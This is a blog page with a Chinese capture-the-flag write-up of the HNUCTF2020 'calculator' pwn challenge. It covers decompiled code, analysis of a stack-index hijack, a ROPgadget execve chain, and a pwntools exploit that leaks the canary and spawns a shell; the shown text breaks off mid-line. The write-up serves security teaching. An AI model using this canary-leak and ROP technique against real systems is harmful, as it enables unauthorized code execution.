@@ -1,0 +1,878 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="HNUCTF, HNU,漏洞挖掘, 调试, 代码, 计算机科学, Kiprey, Blog, 二进制，信息安全" />
+   
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    HNUCTF2020 部分题解 |  Kiprey&#39;s Blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+  
+  
+
+  
+<script>
+var _hmt = _hmt || [];
+(function() {
+	var hm = document.createElement("script");
+	hm.src = "https://hm.baidu.com/hm.js?acff2772e1f74a625e1e26c280afa6c2";
+	var s = document.getElementsByTagName("script")[0]; 
+	s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<link rel="alternate" href="/atom.xml" title="Kiprey's Blog" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-HNUCTF2020-pwn"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  HNUCTF2020 部分题解
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2020/02/HNUCTF2020-pwn/" class="article-date">
+  <time datetime="2020-02-28T16:00:00.000Z" itemprop="datePublished">2020-02-29</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">3.5k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">15 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>HNUCTF2020新生赛 部分pwn题题解</p>
+<h2 id="1-calculator">1. calculator</h2>
+<p>点击 <a href="/2020/02/HNUCTF2020-pwn/pwn6.zip" title="这里">这里</a> 下载题目</p>
+<h3 id="查看保护">查看保护</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Kiprey:~/Desktop/HNUCTF/pwn# checksec pwn6</span><br><span class="line">[*] '/root/Desktop/HNUCTF/pwn/pwn6'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<h3 id="漏洞函数">漏洞函数</h3>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">calc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v1; <span class="comment">// [sp+18h] [bp-5A0h]@4</span></span><br><span class="line">    <span class="keyword">int</span> v2[<span class="number">100</span>]; <span class="comment">// [sp+1Ch] [bp-59Ch]@5</span></span><br><span class="line">    <span class="keyword">char</span> s; <span class="comment">// [sp+1ACh] [bp-40Ch]@2</span></span><br><span class="line">    <span class="keyword">int</span> v4; <span class="comment">// [sp+5ACh] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">    v4 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        bzero(&amp;s, <span class="number">0x400</span>u);</span><br><span class="line">        <span class="keyword">if</span> ( !get_expr((<span class="keyword">int</span>)&amp;s, <span class="number">0x400</span>) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        init_pool(&amp;v1);</span><br><span class="line">        <span class="keyword">if</span> ( parse_expr((<span class="keyword">int</span>)&amp;s, &amp;v1) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_80BF804, v2[v1 - <span class="number">1</span>]);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> __cdecl <span class="title">parse_expr</span><span class="params">(<span class="keyword">int</span> a1, _DWORD *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// ST2C_4@3</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax@4</span></span><br><span class="line">    <span class="keyword">int</span> v4; <span class="comment">// eax@6</span></span><br><span class="line">    <span class="keyword">int</span> v5; <span class="comment">// ebx@25</span></span><br><span class="line">    _BYTE *v6; <span class="comment">// [sp+20h] [bp-88h]@1</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [sp+24h] [bp-84h]@1</span></span><br><span class="line">    <span class="keyword">int</span> v8; <span class="comment">// [sp+28h] [bp-80h]@1</span></span><br><span class="line">    <span class="keyword">char</span> *s1; <span class="comment">// [sp+30h] [bp-78h]@3</span></span><br><span class="line">    <span class="keyword">int</span> v10; <span class="comment">// [sp+34h] [bp-74h]@5</span></span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">100</span>]; <span class="comment">// [sp+38h] [bp-70h]@1</span></span><br><span class="line">    <span class="keyword">int</span> v12; <span class="comment">// [sp+9Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">    v12 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">    v6 = (_BYTE *)a1;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    bzero(s, <span class="number">0x64</span>u);</span><br><span class="line">    <span class="comment">// 注意，程序中将\0也视为运算符进行处理</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 判断是否为运算符，如果是，则进入，并处理当前运算符之前的数据</span></span><br><span class="line">        <span class="comment">//当程序读取到运算符时会处理之前的数据，例如1+2会将1存起来</span></span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(*(_BYTE *)(i + a1) - <span class="string">'0'</span>) &gt; <span class="number">9</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 得到当前运算符与上一个运算符之间的位数</span></span><br><span class="line">            v2 = i + a1 - (_DWORD)v6;</span><br><span class="line">            <span class="comment">// s1指向  当前运算符前、存放数字的char数组</span></span><br><span class="line">            s1 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v2 + <span class="number">1</span>);</span><br><span class="line">            <span class="built_in">memcpy</span>(s1, v6, v2);</span><br><span class="line">            s1[v2] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">"0"</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"prevent division by zero"</span>);</span><br><span class="line">                fflush(<span class="built_in">stdout</span>[<span class="number">0</span>]);</span><br><span class="line">                result = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">            &#125;</span><br><span class="line">            v10 = atoi((<span class="keyword">int</span>)s1);</span><br><span class="line">            <span class="comment">// 如果读取进来的数据是错误的，那么这个错误的数据将不会存储</span></span><br><span class="line">            <span class="keyword">if</span> ( v10 &gt; <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// a2[0] 数字个数 +1</span></span><br><span class="line">                v4 = (*a2)++;</span><br><span class="line">                <span class="comment">// 将atoi得到的数字存起来</span></span><br><span class="line">                a2[v4 + <span class="number">1</span>] = v10;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 判断当前运算符是否为\0,或者+-*/%后面是不是数字，如果不是则进入if</span></span><br><span class="line">            <span class="keyword">if</span> ( *(_BYTE *)(i + a1) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(*(_BYTE *)(i + <span class="number">1</span> + a1) - <span class="string">'0'</span>) &gt; <span class="number">9</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"expression error!"</span>);</span><br><span class="line">                fflush(<span class="built_in">stdout</span>[<span class="number">0</span>]);</span><br><span class="line">                result = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 得到指向运算符后的数字的指针</span></span><br><span class="line">            v6 = (_BYTE *)(i + <span class="number">1</span> + a1);</span><br><span class="line">            <span class="comment">// 判断之前是否已经存了一个运算符</span></span><br><span class="line">            <span class="keyword">if</span> ( s[v8] )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 根据不同的运算符使用不同的运算方式</span></span><br><span class="line">                <span class="keyword">switch</span> ( *(_BYTE *)(i + a1) )</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="comment">// 当遇到优先级较低的 + - 时</span></span><br><span class="line">                <span class="keyword">case</span> <span class="string">'+'</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'-'</span>:</span><br><span class="line">                    <span class="comment">// 处理上一个运算符</span></span><br><span class="line">                    eval(a2, s[v8]);</span><br><span class="line">                    <span class="comment">// 把当前运算符存到上一个运算符存储的地方</span></span><br><span class="line">                    s[v8] = *(_BYTE *)(i + a1);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">// 当遇到优先级较高的 % * / 时</span></span><br><span class="line">                <span class="keyword">case</span> <span class="string">'%'</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'*'</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'/'</span>:</span><br><span class="line">                    <span class="comment">// 如果存储的上一个运算符不是+ -</span></span><br><span class="line">                    <span class="keyword">if</span> ( s[v8] != <span class="string">'+'</span> &amp;&amp; s[v8] != <span class="string">'-'</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">// 那么就处理上一个运算符</span></span><br><span class="line">                        eval(a2, s[v8]);</span><br><span class="line">                        <span class="comment">// 并把当前运算符存到上一个运算符存储的位置</span></span><br><span class="line">                        s[v8] = *(_BYTE *)(i + a1);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>    <span class="comment">// 否则</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">// 上一个运算符不做处理，并将当前运算符存储起来</span></span><br><span class="line">                        s[++v8] = *(_BYTE *)(i + a1);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="comment">// 由于当前的运算符为\0，则处理上一个运算符，并减去存储运算符的数组索引</span></span><br><span class="line">                    eval(a2, s[v8--]);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 将运算符存储起来</span></span><br><span class="line">                s[v8] = *(_BYTE *)(i + a1);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果当前运算符为\0，即整行处理完成，则退出</span></span><br><span class="line">            <span class="keyword">if</span> ( !*(_BYTE *)(i + a1) )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 按照正常流程，处理完所有运算符之后，v8一定会小于0。如果不小于0，则说明还有运算符没处理</span></span><br><span class="line">    <span class="keyword">while</span> ( v8 &gt;= <span class="number">0</span> )</span><br><span class="line">        eval(a2, s[v8--]);</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">    LABEL_25:</span><br><span class="line">    v5 = *MK_FP(__GS__, <span class="number">20</span>) ^ v12;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="易知信息">易知信息</h3>
+<ul>
+<li>程序执行时，会先提示用户输入算式，例如<code>1+2*3</code>，然后执行代码算出所输入的算式的值，进而输出结果</li>
+<li>程序静态链接，ret2libc 不可用</li>
+<li>开启 Canary，不可直接栈溢出</li>
+<li>开启 NX，堆栈不可执行</li>
+<li>main 函数（没贴出来）有简单的反调试机制（alarm)</li>
+<li>calc 函数里有不可直接使用的栈溢出</li>
+<li>calc 函数里调用的 get_expr 函数只允许读取 0-9 ±*/% 这些符号</li>
+</ul>
+<h3 id="分析">分析</h3>
+<ul>
+<li>分析 <code>parse_expr</code> 函数，可以得知参数 <code>a2</code> 的结构
+<ul>
+<li><code>a2[0]</code>存放的是 <code>a2</code> 数组当前存放的数字个数（不包括 <code>a2[0]</code>）</li>
+<li>新添加的数会存放到 <code>a2[a2[0]]</code>这个位置，同时 <code>a2[0]</code>++</li>
+</ul>
+</li>
+<li>分析 <code>parse_expr</code> 函数， 可以得知此函数的处理逻辑
+<ul>
+<li>此函数会先遍历输入的字符串，直到遍历到第一个运算符。再将这个运算符前的上一个数字存入 <code>a2[a2[0]++]</code>。之后处理 <code>a2[a2[0] - 1]</code>与 <code>a2[a2[0] - 2]</code>的运算（执行 eval 函数）<br>
+（此处概括不太全面，建议结合上面的伪代码和注释理解，（实际上结合汇编理解更佳）</li>
+</ul>
+</li>
+<li>eval 函数（没贴出来）会计算 <code>a2[a2[0] - 1]</code>与 <code>a2[a2[0] - 2]</code>, 并将结果存放到 <code>a2[a2[0] - 2]</code>，同时 <code>a2[0]</code>--</li>
+<li>分析 <code>calc</code> 函数，可以得知程序最后会输出 <code>a2[a2[0]]</code></li>
+</ul>
+<h3 id="解决方案">解决方案</h3>
+<ul>
+<li>
+<p>综上分析，只要我们成功劫持 <code>a2[0]</code>，将其修改为我们需要的值，那么就可以任意查看栈上的值</p>
+</li>
+<li>
+<p>同时，由于劫持了 <code>a2[0]</code>，我们同样可以实现栈上任意地址写入,因为“新添加的数会存放到 <code>a2[a2[0]]</code>这个位置”</p>
+</li>
+<li>
+<p>所以我们只要将运算结果写入 <code>a2[0]</code>处，就可劫持成功，即输入以运算符开头的字符串，即可劫持。然后就可以栈区任意读写了。</p>
+</li>
+<li>
+<p>由于该程序是静态链接，无法 <code>ret2libc</code> 。但正因为是静态链接，所以程序中有大量可用的 ROP 片段。通过 ROPgadget，可以得到 ROPchain，从而 get shell</p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># execve generated by ROPgadget</span></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080701aa</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ec060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805c34b</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'/bin'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809b30d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080701aa</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ec064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805c34b</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809b30d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080701aa</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ec068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080550d0</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809b30d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481d1</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ec060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080701d1</span>) <span class="comment"># pop ecx ; pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ec068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ec060</span>) <span class="comment"># padding without overwrite ebx</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080701aa</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ec068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080550d0</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807cb7f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049a21</span>) <span class="comment"># int 0x80</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>注意点:</p>
+<ul>
+<li>应当先查看 <code>canary</code> 值并记录，以便于在向栈写入数据后可以覆写 <code>canary</code> ，从而通过 <code>Canary</code> 的检测</li>
+<li>写入数据时应当反序写入，即先写入远离 <code>Canary</code> 那端的栈空间，最后在写入距离 <code>Canary</code> 较近的栈空间，因为写入远离 <code>Canary</code> 那端的栈空间时会破坏距离 <code>Canary</code> 较近的栈空间上的数据</li>
+</ul>
+</li>
+</ul>
+<h4 id="EXP">EXP</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 比赛IP被我隐藏了XD</span></span><br><span class="line">io = remote(<span class="string">"xx.xx.xx.xx"</span>, <span class="number">8012</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取canary, 传入+357</span></span><br><span class="line">canary_offset = <span class="number">357</span></span><br><span class="line">io.sendlineafter(<span class="string">"记住，未来，是创造就对了~\n"</span>, <span class="string">"+"</span> + str(canary_offset))</span><br><span class="line">canary_str = io.recvline(keepends=<span class="literal">False</span>)</span><br><span class="line">canary = int(canary_str)</span><br><span class="line"><span class="comment"># 如果读取到的canary为负, 根据atoi函数的特性，没办法模拟，只能退出重来</span></span><br><span class="line"><span class="keyword">if</span> canary &lt; <span class="number">0</span>:</span><br><span class="line">    log.failure(<span class="string">"Canary is negative!"</span>)</span><br><span class="line">    exit()</span><br><span class="line">log.success(<span class="string">"Canary found: "</span> + str(hex(canary)))</span><br><span class="line"></span><br><span class="line">ROP_chain = [</span><br><span class="line">    canary,</span><br><span class="line">    <span class="number">0x12345678</span>, <span class="number">0x12345678</span>, <span class="number">0x12345678</span>,  <span class="comment"># 3个padding</span></span><br><span class="line">    <span class="number">0x080701aa</span>, <span class="number">0x080ec060</span>, <span class="number">0x0805c34b</span>, u32(<span class="string">"/bin"</span>),</span><br><span class="line">    <span class="number">0x0809b30d</span>, <span class="number">0x080701aa</span>, <span class="number">0x080ec064</span>, <span class="number">0x0805c34b</span>, u32(<span class="string">"//sh"</span>), <span class="number">0x0809b30d</span>,</span><br><span class="line">    <span class="number">0x080701aa</span>, <span class="number">0x080ec068</span>, <span class="number">0x080550d0</span>, <span class="number">0x0809b30d</span>,</span><br><span class="line">    <span class="number">0x080481d1</span>, <span class="number">0x080ec060</span>,</span><br><span class="line">    <span class="number">0x080701d1</span>, <span class="number">0x080ec068</span>, <span class="number">0x080ec060</span>,</span><br><span class="line">    <span class="number">0x080701aa</span>, <span class="number">0x080ec068</span>,</span><br><span class="line">    <span class="number">0x080550d0</span>,</span><br><span class="line">    <span class="number">0x0807cb7f</span>, <span class="number">0x0807cb7f</span>, <span class="number">0x0807cb7f</span>, <span class="number">0x0807cb7f</span>, <span class="number">0x0807cb7f</span>, <span class="number">0x0807cb7f</span>,</span><br><span class="line">    <span class="number">0x0807cb7f</span>, <span class="number">0x0807cb7f</span>, <span class="number">0x0807cb7f</span>, <span class="number">0x0807cb7f</span>, <span class="number">0x0807cb7f</span>,</span><br><span class="line">    <span class="number">0x08049a21</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意要倒着写入栈，因为向高地址栈写入数据会破坏低地址栈写入的数据</span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(len(ROP_chain) - <span class="number">1</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendline(<span class="string">"+"</span> + str(canary_offset - <span class="number">1</span> + index)</span><br><span class="line">                + <span class="string">"+"</span> + str(ROP_chain[index]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将输出的大量无用数据全部丢弃</span></span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment"># 输入\n退出calc函数，进入ret</span></span><br><span class="line">io.sendline(<span class="string">""</span>)</span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">log.success(<span class="string">"get shell!"</span>)</span><br><span 